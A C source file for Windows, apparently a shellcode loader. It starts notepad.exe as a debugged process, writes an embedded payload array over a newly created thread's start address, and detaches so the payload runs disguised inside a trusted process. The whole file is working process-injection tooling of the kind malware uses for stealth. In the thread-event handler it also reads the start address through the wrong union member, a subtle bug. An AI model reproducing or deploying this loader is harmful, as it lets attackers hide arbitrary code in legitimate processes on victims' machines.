#include <Windows.h>
#include <stdio.h>

#include "sc.h"


#define TARGET_PROCESS_PATH		L"C:\\Windows\\System32\\notepad.exe"
#define GET_FILENAMEW(PATH)		(wcsrchr((PATH), L'/') ? wcsrchr((PATH), L'/') + 1 : (wcsrchr((PATH), L'\\') ? wcsrchr((PATH), L'\\') + 1 : (PATH)))


int main()
{
	STARTUPINFOW			StartupInfo = { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION		ProcessInfo = { 0 };
	WCHAR					szTargetProcess[MAX_PATH] = TARGET_PROCESS_PATH;
	DEBUG_EVENT				DebugEvent = { 0 };
	SIZE_T					sNumberOfBytesWritten = 0x00;

	if (!CreateProcessW(szTargetProcess, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
		return -1;
	}

	printf("[i] %ws Process Created With PID: %d \n", GET_FILENAMEW(TARGET_PROCESS_PATH), ProcessInfo.dwProcessId);

	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {

		switch (DebugEvent.dwDebugEventCode) {

		case CREATE_THREAD_DEBUG_EVENT: {

			printf("[+] Targetting Thread: %d\n", GetThreadId(DebugEvent.u.CreateThread.hThread));
			printf("[i] Writing Shellcode At Thread's Start Address: 0x%p \n", DebugEvent.u.CreateProcessInfo.lpStartAddress);

			if (!WriteProcessMemory(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, stardust_x64_bin, (SIZE_T)stardust_x64_bin_len, &sNumberOfBytesWritten) || sNumberOfBytesWritten != stardust_x64_bin_len) {
				printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
				printf("[i] Wrote %d Of %d Bytes \n", (int)sNumberOfBytesWritten, stardust_x64_bin_len);
				return -1;
			}

			if (!DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
				printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
				return -1;
			}

			ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);

			// Detach child process
			goto _END_OF_FUNC;

		};

		case EXIT_PROCESS_DEBUG_EVENT:
			printf("[i] Remote Process Terminated \n");
			return 0;

		default:
			break;
		}

		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}

_END_OF_FUNC:
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	return 0;
}